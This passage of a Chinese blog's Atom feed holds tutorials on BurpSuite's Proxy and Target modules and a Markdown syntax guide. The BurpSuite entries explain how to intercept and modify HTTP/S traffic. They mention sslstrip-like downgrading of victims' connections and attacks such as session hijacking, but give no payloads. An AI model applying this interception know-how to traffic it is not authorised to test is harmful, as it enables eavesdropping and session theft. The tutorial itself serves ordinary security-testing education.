      &lt;h1 id=&quot;引言&quot;&gt;&lt;a href=&quot;#引言&quot; class=&quot;headerlink&quot; title=&quot;引言&quot;&gt;&lt;/a&gt;引言&lt;/h1&gt;&lt;p&gt;BurpSuite之Spider模块(蜘蛛爬行)&lt;/p&gt;
    
    </summary>
    
      <category term="软件安装与使用" scheme="http://archimesan.me/categories/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/"/>
    
      <category term="Burpsuite" scheme="http://archimesan.me/categories/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/Burpsuite/"/>
    
    
      <category term="工具" scheme="http://archimesan.me/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>BurpSuite系列之Proxy模块</title>
    <link href="http://archimesan.me/2018/03/01/BurpSuite%E7%B3%BB%E5%88%97%E4%B9%8BProxy%E6%A8%A1%E5%9D%97/"/>
    <id>http://archimesan.me/2018/03/01/BurpSuite系列之Proxy模块/</id>
    <published>2018-03-01T09:18:24.000Z</published>
    <updated>2019-03-26T09:18:48.243Z</updated>
    
    <content type="html"><![CDATA[<p>BurpSuite系列之Proxy模块(代理模块) </p><a id="more"></a><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Proxy代理模块作为BurpSuite的核心功能，拦截HTTP/S的代理服务器，作为一个在浏览器和目标应用程序之间的中间人，允许你拦截，查看，修改在两个方向上的原始数据流。</p><p>Burp代理允许你通过监视和操纵应用程序传输的关键参数和其他数据来查找和探索应用程序的漏洞。通过以恶意的方式修改浏览器的请求，Burp 代理可以用来进行攻击，如：SQL 注入，cookie欺骗，提升权限，会话劫持，目录遍历，缓冲区溢出。拦截的传输可以被修改成原始文本，也可以是包含参数或者消息头的表格，也可以十六进制形式，甚至可以操纵二进制形式的数据。在 Burp 代理可以呈现出包含 HTML 或者图像数据的响应消息。</p><h1 id="模块说明"><a href="#模块说明" class="headerlink" title="模块说明"></a>模块说明</h1><h2 id="Intercept"><a href="#Intercept" class="headerlink" title="Intercept"></a>Intercept</h2><p>用于显示和修改HTTP请求和响应，通过你的浏览器和Web服务器之间。在BurpProxy的选项中，您可以配置拦截规则来确定请求是什么和响应被拦截(例如，范围内的项目，与特定文件扩展名，项目要求与参数，等)。该面板还包含以下控制：</p><p><img src="1.png" alt></p><p>消息类型显示的四种格式</p><p><img src="2.png" alt></p><p>raw：这里显示的是纯文本形式的消息。在文本窗口的底部提供了一个搜索和加亮功能，可以用它来快速地定位出消息中的感兴趣的字符串，如错误消息。在搜索的左边有一个弹出项，让你来处理大小写问题，以及是使用简单的文本搜索还是正则表达搜索。</p><p>params：对包含参数(URL 查询字符串，cookies 消息头，或消息体)的请求，这个选项可以把参数分析成名称/值的组合，并且允许你能简单地查看和修改。</p><p>headers：这里以名称/值的组合来显示 HTTP 的消息头，并且还以原始的形式显示消息体。</p><p>hex：这里允许你直接编辑消息的原始二进制数据。如果在文本编辑器里修改，某些传输类型(例如，使用 MIME 编码的浏览器请求的部分)包含的二进制数据可能被损坏。为了修改这些类型的消息，应使用十六进制。</p><h3 id="Forward"><a href="#Forward" class="headerlink" title="Forward"></a>Forward</h3><p>当你编辑信息之后，发送信息到服务器或浏览器</p><h3 id="Drop"><a href="#Drop" class="headerlink" title="Drop"></a>Drop</h3><p>当你不想要发送这次信息可以点击drop放弃这个拦截信息</p><h3 id="Interceptionis-on-off"><a href="#Interceptionis-on-off" class="headerlink" title="Interceptionis on/off"></a>Interceptionis on/off</h3><p>这个按钮用来切换和关闭所有拦截。如果按钮显示Interceptionis On，表示请求和响应将被拦截或自动转发根据配置的拦截规则配置代理选项。如果按钮显示Interception is off则显示拦截之后的所有信息将自动转发。</p><h3 id="Action"><a href="#Action" class="headerlink" title="Action"></a>Action</h3><p>说明一个菜单可用的动作行为操作可以有哪些操作功能。</p><p><img src="3.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Send to Spider          发送给蜘蛛</span><br><span class="line">Do an active scan       执行主动扫描</span><br><span class="line">Send to Intruder        发送到入侵者</span><br><span class="line">Send to Repeater        发送到中继器</span><br><span class="line">Send to Sequencer       发送到序列发生器</span><br><span class="line">Send to Comparer        发送到比较器</span><br><span class="line">Send to Decoder         发送到解码器</span><br><span class="line">Request in browser      在浏览器的请求</span><br><span class="line">Engagement tools        参与工具</span><br></pre></td></tr></table></figure><p>1.Change request method  </p><p>对所有的请求，经过把所有相关的请求参数适当地搬迁到这个请求里来，你就可以自动地把请求的方法在 POST 和 GET 中间切换。通过发送恶意的请求使用这个选项来快速测试应用程序的极限参数是多少。</p><p>2.Change body encoding  </p><p>对于所有的请求，你可以在应用程序/X-WWW 格式的 URL 编码和多重表单/数据之间切换消息体的编码方式。</p><p>3.Copy URL       </p><p>把当前的 URL 完整地复制到粘贴板上。</p><p>4.Cope as curl command  </p><p>作为curl命令</p><p>5.Cope to file </p><p>这个功能允许你把选择一个文件，并把消息的内容复制到这个文件里。这个对二进制数据来说是很方便的，要是通过粘贴板来复制会带来一些问题。复制操作是在选择的文本上进行的，如果没有被选中的内容，则是针对整个消息了。</p><p>6.Pase form file </p><p>这个功能允许你选择一个文件，并把文件里的内容粘贴到消息里。这个对二进制数据来说是很方便的，要是通过粘贴板来复制会带来一些问题。粘贴操作会替换掉被选中的内容，如果没有内容被选中，则在光标位置插入这些内容。</p><p>7.Save item</p><p>这个功能让你指定一个文件，把选中的请求和响应以XML的格式保存到这个文件，这里面包括所有的元数据如：响应的长度，HTTP 的状态码以及 MIME 类型。</p><p>8.Don’t intercept requests   </p><p>通过这些命令可以快速地添加拦截动作的规则来阻止拦截到的消息，这些消息和当前的消息有着相同的特征(如远程主机，资源类型，响应编码)。</p><p>9.Do intercept                           </p><p>仅对请求有效，这允许你可以对当请求和响应的进行强制拦截。</p><p>10.Convert seiection                 </p><p>这些功能让你能够以多种方案对选择的文本进行快速的编码和解码。<br>11URL-encode as you type   </p><p>如果这个选项被打开，你输入的像&amp;和=这样的符号会被等价的 URL编码代替。</p><p>Cut                           剪切<br>Copy                          复制<br>Paste                         粘贴<br>Message edit help             消息编辑帮助<br>Proxy interception help       代理拦截帮助</p><h2 id="HTTP-History"><a href="#HTTP-History" class="headerlink" title="HTTP History"></a>HTTP History</h2><p>这个选项是来显示所有请求产生的细节，显示的有目标服务器和端口，HTTP 方法，URL，以及请求中是否包含参数或被人工修改，HTTP 的响应状态码，响应字节大小，响应的 MIME类型，请求资源的文件类型，HTML 页面的标题，是否使用 SSL，远程 IP 地址，服务器设置的 cookies，请求的时间。</p><p><img src="4.png" alt></p><p>双击某个请求即可打开详情,通过Previous/next可以快速切换请求，并且Action也可以将请求发送至其他模块。</p><p><img src="5.png" alt></p><p>可以通过最左边的列里的下拉菜单来加亮单个选项：</p><p><img src="6.png" alt></p><p>在历史记录表里，右击一个或多个选项，就会显示一个上下文菜单让你执行一些操作，包括修改目标范围，把这些选项发送到其他 Burp 工具，或者删除这些项：</p><p><img src="7.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Add to scope                   添加范围</span><br><span class="line">Spide from here                蜘蛛从当前地址开始</span><br><span class="line">Do an active scan              执行主动扫描</span><br><span class="line">Do a passive scan              做被动扫描</span><br><span class="line">Send to Intruder               发送到入侵者</span><br><span class="line">Send to Repeater               发送到中继器</span><br><span class="line">Send to Sequencer              发送到序列生成器</span><br><span class="line">Send to Comparer(request)      发送到比较器（请求）</span><br><span class="line">Send to Comparer(response)     发送到比较器（响应）</span><br><span class="line">Show response in browser       在浏览器中显示响应</span><br><span class="line">Request in browser             浏览请求</span><br><span class="line">Engagement tools               接合工具</span><br><span class="line">Show new History windows       显示新的历史窗口</span><br><span class="line">Add comment                    添加评论</span><br><span class="line">Highlight                      高亮部分</span><br><span class="line">Delete item                    删除项目</span><br><span class="line">Clear history                  清除历史记录</span><br><span class="line">Copy URL                       复制网址</span><br><span class="line">Copy as curl command           复制为curl命令</span><br><span class="line">Copy links                     复制链接</span><br><span class="line">Save item                      保存项目</span><br><span class="line">Proxy history help             代理历史帮助</span><br></pre></td></tr></table></figure><p>还可以通过配置过滤器来确定哪些顶层的数据项显示在表格里。有效应用程序包含了大量的内容，如图像，CSS 等，这些有利于从视图上隐藏的。AJAX 应用程序产生大量相似的异步请求，你可能会想把他们从视图上过滤出来来查看一些感兴趣的项。在这个历史记录表的顶部有一个过滤栏。单击会有一个弹出窗口，让你来精准地配置显示哪些内容在表格里：</p><p><img src="8.png" alt></p><h2 id="WebSockets-history"><a href="#WebSockets-history" class="headerlink" title="WebSockets history"></a>WebSockets history</h2><p>这个选项主要用于记录WebSockets的数据包，是HTML5中最强大的通信功能，定义了一个全双工的通信信道，只需Web上的一个 Socket即可进行通信，能减少不必要的网络流量并降低网络延迟。</p><p><img src="9.png" alt></p><h2 id="Options"><a href="#Options" class="headerlink" title="Options"></a>Options</h2><p>该选项主要用于设置代理监听、请求和响应，拦截反应，匹配和替换，ssl等，其中有八大选项:Proxy Listeners、Intercept Client Requests、Intercept Server Responses、Intercept WebSockets Messages、Response Modification、Match and replace、SSL Pass Through、Miscellaneous</p><h3 id="Proxy-Listeners"><a href="#Proxy-Listeners" class="headerlink" title="Proxy Listeners"></a>Proxy Listeners</h3><p><img src="10.png" alt></p><p>代理侦听器是侦听从您的浏览器传入的连接本地HTTP代理服务器。它允许您监视和拦截所有的请求和响应，并且位于BurpProxy的工作流的心脏。默认情况下，Burp默认监听12.0.0.1地址，端口8080。要使用这个监听器，你需要配置你的浏览器使用127.0.0.1:8080作为代理服务器。此默认监听器是必需的测试几乎所有的基于浏览器的所有Web应用程序。</p><p>1.add：添加一个新的代理地址。</p><p>   1.binding：新建一个代理，bind to port-绑定端口号 ，bind to address -绑定ip地址</p><p>   <img src="11.png" alt></p><p>   2.request hadning:这些设置包括选项来控制是否BurpSuite重定向通过此侦听器接收到的请求：</p><pre><code>2.1.Redirect to host如果配置了这个选项，Burp会在每次请求转发到指定的主机，而不必受限于览器所请求的目标。需要注意的是，如果你正使用该选项，则可能需要配置匹配/替换规则重写的主机中的请求，如果服务器中，您重定向请求预期，不同于由浏览器发送一个主机头。2.2.Redirect to port 如果配置了这个选项，Burp会在每次请求转发到指定的端口，而不必受限于浏览2.3.Force use of SSL 如果配置了这个选项，Burp会使用HTTPS在所有向外的连接，即使传入的请求中使用普通的HTTP。您可以使用此选项，在与SSL相关的响应修改选项结合，开展sslstrip般的攻击使用Burp，其中，强制执行HTTPS的应用程序可以降级为普通的HTTP的受害用户的流量在不知不觉中通过BurpProxy代理。![](12.png)</code></pre><p>   3.Certificate:这些设置控制呈现给客户端的SSL服务器的SSL证书。</p><pre><code>3.1.Generate CA-signed per-host certificate-这是默认选项。安装后，BurpSuite创造了一个独特的自签名的证书颁发机构（CA）证书，并将此计算机上使用，每次BurpSuite运行。当你的浏览器发出SSL连接到指定的主机，Burp产生该主机，通过CA证书签名的SSL证书。您可以安装BurpSuite的CA证书作为在浏览器中受信任的根，从而使每个主机的证书被接受，没有任何警报。您还可以导出其他工具或Burp的其他实例使用CA证书。3.2.Generate a CA-signed certificate with a specific hostname---||这类似于前面的选项;然而，Burp会产生一个单一的主机证书与每一个SSL连接使用，使用您指定的主机名。在进行无形的代理时，此选项有时是必要的，因为客户端没有发送连接请求，因此Burp不能确定SSL协议所需的主机名。你也可以安装BurpSuite的CA证书作为受信任的根。3.3.Use a custom certificate---||-此选项使您可以加载一个特定的证书（在PKCS＃12格式）呈现给你的浏览器。如果应用程序使用它需要特定的服务器证书（例如一个给定序列号或证书链）的客户端应该使用这个选项。![](13.png)</code></pre><p>2.edit：编辑选中的代理地址。</p><p>3.remove：删除选中代理地址。</p><h3 id="Intercept-Client-Requests"><a href="#Intercept-Client-Requests" class="headerlink" title="Intercept Client Requests"></a>Intercept Client Requests</h3><p>配置拦截规则，设置拦截的匹配规则。 当Intercept request based on the following rules为选中状态时，burpsuite会配置列表中的规则进行拦截或转发。</p><p>注意：如果该复选框未选中，那么即使Intercept is on也无法截取数据包。</p><p>规则可以通过Enabled列中的复选框选择开启或关闭。<br>规则可以是域名， IP地址，协议， HTTP方法， URL，文件扩展名，参数，cookie，头/主体内容，状态代码，MIME类型， HTML页面标题等。<br>规则按顺序处理，并且使用布尔运算符AND和OR组合。</p><h3 id="Intercept-Server-Responses"><a href="#Intercept-Server-Responses" class="headerlink" title="Intercept Server Responses"></a>Intercept Server Responses</h3><p>配置拦截规则，设置拦截的匹配规则，不过这个选项是基于服务端拦截，当选小的Intercept request based on the following rules为选中状态时，burpsuite会匹配响应包。</p><h3 id="Intercept-WebSockets-Messages"><a href="#Intercept-WebSockets-Messages" class="headerlink" title="Intercept WebSockets Messages"></a>Intercept WebSockets Messages</h3><h3 id="Response-Modification"><a href="#Response-Modification" class="headerlink" title="Response Modification"></a>Response Modification</h3><p><img src="14.png" alt></p><p><img src="14_1.png" alt></p><h3 id="Match-and-replace"><a href="#Match-and-replace" class="headerlink" title="Match and replace"></a>Match and replace</h3><p>用于自动替换请求和响应通过代理的部分。对于每一个HTTP消息，已启用的匹配和替换规则依次执行，选择适用的规则进行匹配执行。<br>规则可以分别被定义为请求和响应，对于消息头和身体，并且还特别为只请求的第一行。每个规则可以指定一个文字字符串或正则表达式来匹配，和一个字符串来替换它。对于邮件头，如果匹配条件，整个头和替换字符串匹配留空，然后头被删除。如果指定一个空的匹配表达式，然后替换字符串将被添加为一个新的头。有可协助常见任务的各种缺省规则 - 这些都是默认为禁用。 匹配多行区域。您可以使用标准的正则表达式语法来匹配邮件正文的多行区域。</p><h3 id="SSL-Pass-Through"><a href="#SSL-Pass-Through" class="headerlink" title="SSL Pass Through"></a>SSL Pass Through</h3><p><img src="15.png" alt></p><h3 id="Miscellaneous"><a href="#Miscellaneous" class="headerlink" title="Miscellaneous"></a>Miscellaneous</h3><p><img src="16.png" alt></p><p>介绍：仅供技术交流学习探讨，请勿用于非法用途,。本文部分资源来源于网络，如有侵权请联系版主删除。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;BurpSuite系列之Proxy模块(代理模块) &lt;/p&gt;
    
    </summary>
    
      <category term="软件安装与使用" scheme="http://archimesan.me/categories/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/"/>
    
      <category term="Burpsuite" scheme="http://archimesan.me/categories/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/Burpsuite/"/>
    
    
      <category term="工具" scheme="http://archimesan.me/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>BurpSuite系列之Target模块</title>
    <link href="http://archimesan.me/2018/02/12/BurpSuite%E7%B3%BB%E5%88%97%E4%B9%8BTarget%E6%A8%A1%E5%9D%97/"/>
    <id>http://archimesan.me/2018/02/12/BurpSuite系列之Target模块/</id>
    <published>2018-02-12T08:57:49.000Z</published>
    <updated>2019-03-26T09:18:27.338Z</updated>
    
    <content type="html"><![CDATA[<p>BurpSuite系列之Target模块</p><a id="more"></a><h1 id="Target功能"><a href="#Target功能" class="headerlink" title="Target功能"></a>Target功能</h1><p>目标工具包含了SiteMap，用你的目标应用程序的详细信息。它可以让你定义哪些对象在范围上为你目前的工作，也可以让你手动测试漏洞的过程。<br>Target分为site map和scope两个选项卡。</p><h3 id="选项一：Site-Map"><a href="#选项一：Site-Map" class="headerlink" title="选项一：Site Map"></a>选项一：Site Map</h3><p>SiteMap会在目标中以树形和表形式显示，并且还可以查看完整的请求和响应。树视图包含内容的分层表示，随着细分为地址，目录，文件和参数化请 求的URL 。您还可以扩大有趣的分支才能看到进一步的细节。如果您选择树的一个或多个部分，在所有子分支所选择的项目和项目都显示在表视图。</p><p>该表视图显示有关每个项目（URL ， HTTP状态代码，网页标题等）的关键细节。您可以根据任意列进行排序表（单击列标题来循环升序排序，降序排序，和未排序） 如果您在表中选择一个项目，请求和响应（如适用）该项目显示在请求/响应窗格。这包含了请求和响应的HTTP报文的编辑器，提供每封邮件的详细分析。</p><p>站点地图汇总所有的信息BurpSuite已经收集到的有关申请。这包括：</p><p>所有这一切都通过代理服务器直接请求的资源。已推断出通过分析响应代理请求的任何物品（前提是你没有禁用被动Spider）。<br>内容使用Spider或内容发现功能查找。由用户手动添加的任何项目，从其它工具的输出。</p><p><img src="1.png" alt></p><p>这样看起来site map是不是很乱，则可以右击add to scope，然后点击Filter勾选Show only in-scope items，此时你再回头看Site map就只有百度一个地址了，这里filter可以过滤一些参数，show all显示全部，hide隐藏所有，如果勾选了表示不过滤。</p><p><img src="2.png" alt></p><p><img src="3.png" alt></p><p>选择之后就只剩下一个网址了</p><p><img src="4.png" alt></p><p>针对地址右击显示当前可以做的一些动作操作等功能。</p><p><img src="5.png" alt></p><h3 id="选项二：Scope"><a href="#选项二：Scope" class="headerlink" title="选项二：Scope"></a>选项二：Scope</h3><p>这个主要是配合Site map做一些过滤的功能</p><p><img src="6.png" alt></p><p>已请求在SiteMap中的项目会显示为黑色。尚未被请求的项目显示为灰色</p><p><img src="7.png" alt></p><p>介绍：仅供技术交流学习探讨，请勿用于非法用途,。本文部分资源来源于网络，如有侵权请联系版主删除。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;BurpSuite系列之Target模块&lt;/p&gt;
    
    </summary>
    
      <category term="软件安装与使用" scheme="http://archimesan.me/categories/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/"/>
    
      <category term="Burpsuite" scheme="http://archimesan.me/categories/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/Burpsuite/"/>
    
    
      <category term="工具" scheme="http://archimesan.me/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>Markdown基本用法</title>
    <link href="http://archimesan.me/2018/02/08/Markdown%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/"/>
    <id>http://archimesan.me/2018/02/08/Markdown基本用法/</id>
    <published>2018-02-08T07:40:01.000Z</published>
    <updated>2019-03-25T08:58:38.979Z</updated>
    
    <content type="html"><![CDATA[<p>Markdown基本语法</p><a id="more"></a><p>Markdown是一种纯文本格式的标记语言。通过简单的标记语法，它可以使普通文本内容具有一定的格式。<br>相比WYSIWYG编辑器</p><p><strong>优点</strong></p><p>1、因为是纯文本，所以只要支持Markdown的地方都能获得一样的编辑效果，可以让作者摆脱排版的困扰，专心写作。<br>2、操作简单。比如:WYSIWYG编辑时标记个标题，先选中内容，再点击导航栏的标题按钮，选择几级标题。<br>要三个步骤。而Markdown只需要在标题内容前加#即可</p><p><strong>缺点</strong></p><p>1、需要记一些语法（当然，是很简单。五分钟学会）。<br>2、有些平台不支持Markdown编辑模式。<br>还好，简书是支持Markdown编辑模式的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">开启方式：设置-&gt;默认编辑器-&gt;Markdown编辑器</span><br></pre></td></tr></table></figure><h1 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h1><p>在想要设置为标题的文字前面加#来表示<br>一个#是一级标题，二个#是二级标题，以此类推。支持六级标题。<br>注：标准语法一般在#后跟个空格再写文字，貌似简书不加空格也行。</p><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 这是一级标题</span><br><span class="line">## 这是二级标题</span><br><span class="line">### 这是三级标题</span><br><span class="line">#### 这是四级标题</span><br><span class="line">##### 这是五级标题</span><br><span class="line">###### 这是六级标题</span><br></pre></td></tr></table></figure><p>效果如下：</p><h1 id="这是一级标题"><a href="#这是一级标题" class="headerlink" title="这是一级标题"></a>这是一级标题</h1><h2 id="这是二级标题"><a href="#这是二级标题" class="headerlink" title="这是二级标题"></a>这是二级标题</h2><h3 id="这是三级标题"><a href="#这是三级标题" class="headerlink" title="这是三级标题"></a>这是三级标题</h3><h4 id="这是四级标题"><a href="#这是四级标题" class="headerlink" title="这是四级标题"></a>这是四级标题</h4><h5 id="这是五级标题"><a href="#这是五级标题" class="headerlink" title="这是五级标题"></a>这是五级标题</h5><h6 id="这是六级标题"><a href="#这是六级标题" class="headerlink" title="这是六级标题"></a>这是六级标题</h6><h1 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h1><ul><li><strong>这是加粗的文字</strong></li></ul><p>要加粗的文字左右分别用两个*号包起来</p><ul><li><strong>这是倾斜的文字</strong></li></ul><p>要倾斜的文字左右分别用一个*号包起来</p><ul><li><strong>斜体加粗</strong></li></ul><p>要倾斜和加粗的文字左右分别用三个*号包起来</p><ul><li><strong>删除线</strong></li></ul><p>要加删除线的文字左右分别用两个~~号包起来</p><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">**这是加粗的文字**</span><br><span class="line">*这是倾斜的文字*`</span><br><span class="line">***这是斜体加粗的文字***</span><br><span class="line">~~这是加删除线的文字~~</span><br></pre></td></tr></table></figure><p>效果如下：</p><p><strong>这是加粗的文字</strong><br><em>这是倾斜的文字</em><br><strong><em>这是斜体加粗的文字</em></strong><br><del>这是加删除线的文字</del></p><h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1><p>在引用的文字前加&gt;即可。引用也可以嵌套，如加两个&gt;&gt;三个&gt;&gt;&gt;<br>n个…<br>貌似可以一直加下去，但没神马卵用</p><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;这是引用的内容</span><br><span class="line">&gt;&gt;这是引用的内容</span><br><span class="line">&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;这是引用的内容</span><br></pre></td></tr></table></figure><p>效果如下：</p><blockquote><p>这是引用的内容</p><blockquote><p>这是引用的内容</p><blockquote><blockquote><blockquote><blockquote><blockquote><blockquote><blockquote><blockquote><p>这是引用的内容</p></blockquote></blockquote></blockquote></blockquote></blockquote></blockquote></blockquote></blockquote></blockquote></blockquote><h1 id="分割线"><a href="#分割线" class="headerlink" title="分割线"></a>分割线</h1><p>三个或者三个以上的 - 或者 * 都可以。</p><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">-</span><br><span class="line">***</span><br><span class="line">*****</span><br></pre></td></tr></table></figure><p>效果如下：</p><p>-</p><hr><hr><p>可以看到，显示效果是一样的。</p><h1 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h1><p>语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">![图片alt](图片地址 &apos;&apos;图片title&apos;&apos;)</span><br><span class="line"></span><br><span class="line">图片alt就是显示在图片下面的文字，相当于对图片内容的解释。</span><br><span class="line">图片title是图片的标题，当鼠标移到图片上时显示的内容。title可加可不加</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">![blockchain](https://ss0.bdstatic.com/70cFvHSh_Q1YnxGkpoWK1HF6hhy/it/</span><br><span class="line">u=702257389,1274025419&amp;fm=27&amp;gp=0.jpg &quot;区块链&quot;)</span><br></pre></td></tr></table></figure><p>效果如下：</p><p><img src="https://ss0.bdstatic.com/70cFvHSh_Q1YnxGkpoWK1HF6hhy/it/u=702257389,1274025419&amp;fm=27&amp;gp=0.jpg" alt="blockchain" title="区块链"></p><p><strong>上传本地图片直接点击导航栏的图片标志，选择图片即可</strong></p><h1 id="超链接"><a href="#超链接" class="headerlink" title="超链接"></a>超链接</h1><p>语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[超链接名](超链接地址 &quot;超链接title&quot;)</span><br><span class="line">title可加可不加</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[简书](http://jianshu.com)</span><br><span class="line">[百度](http://baidu.com)</span><br></pre></td></tr></table></figure><p>效果如下：</p><p><a href="http://jianshu.com" target="_blank" rel="noopener">简书</a><br><a href="http://baidu.com" target="_blank" rel="noopener">百度</a></p><p>注：Markdown本身语法不支持链接在新页面中打开，貌似简书做了处理，是可以的。别的平台可能就不行了，如果想要在新页面中打开的话可以用html语言的a标签代替。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;超链接地址&quot; target=&quot;_blank&quot;&gt;超链接名&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">示例:</span><br><span class="line">&lt;a href=&quot;https://www.jianshu.com/u/1f5ac0cf6a8b&quot; target=&quot;_blank&quot;&gt;简书&lt;/a&gt;</span><br></pre></td></tr></table></figure><h1 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h1><ul><li><strong>无序列表</strong></li></ul><p>语法：<br>无序列表用 - + * 任何一种都可以</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">- 列表内容</span><br><span class="line">+ 列表内容</span><br><span class="line">* 列表内容</span><br><span class="line">注意：- + * 跟内容之间都要有一个空格</span><br></pre></td></tr></table></figure><p>效果如下：</p><ul><li>列表内容</li></ul><ul><li>列表内容</li></ul><ul><li><p>列表内容</p></li><li><p><strong>有序列表</strong></p></li></ul><p>语法：<br>数字加点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.列表内容</span><br><span class="line">2.列表内容</span><br><span class="line">3.列表内容</span><br><span class="line"></span><br><span class="line">注意：序号跟内容之间要有空格</span><br></pre></td></tr></table></figure><p>效果如下：</p><p>1.列表内容<br>2.列表内容<br>3.列表内容</p><ul><li><strong>列表嵌套</strong></li></ul><p><strong>上一级和下一级之间敲三个空格即可</strong></p><ul><li><p>一级无序列表内容</p><ul><li>二级无序列表内容</li><li>二级无序列表内容</li><li>二级无序列表内容</li></ul></li><li><p>一级无序列表内容</p><ol><li>二级有序列表内容</li><li>二级有序列表内容</li><li>二级有序列表内容</li></ol></li></ul><ol><li>一级有序列表内容</li></ol><ul><li>二级无序列表内容</li><li>二级无序列表内容</li><li>二级无序列表内容</li></ul><p>2.一级有序列表内容</p><ol><li>二级有序列表内容</li><li>二级有序列表内容</li><li>二级有序列表内容</li></ol><h1 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h1><p>语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">表头|表头|表头</span><br><span class="line">|:--:|:</span><br><span class="line">内容|内容|内容</span><br><span class="line">内容|内容|内容</span><br><span class="line"></span><br><span class="line">第二行分割表头和内容。</span><br><span class="line">- 有一个就行，为了对齐，多加了几个</span><br><span class="line">文字默认居左</span><br><span class="line">-两边加：表示文字居中</span><br><span class="line">-右边加：表示文字居右</span><br><span class="line">注：原生的语法两边都要用 | 包起来。此处省略</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">姓名|技能|排行</span><br><span class="line">--|:--:|--:</span><br><span class="line">刘备|哭|大哥</span><br><span class="line">关羽|打|二哥</span><br><span class="line">张飞|骂|三弟</span><br></pre></td></tr></table></figure><p>效果如下：</p><table><thead><tr><th>姓名</th><th style="text-align:center">技能</th><th style="text-align:right">排行</th></tr></thead><tbody><tr><td>刘备</td><td style="text-align:center">哭</td><td 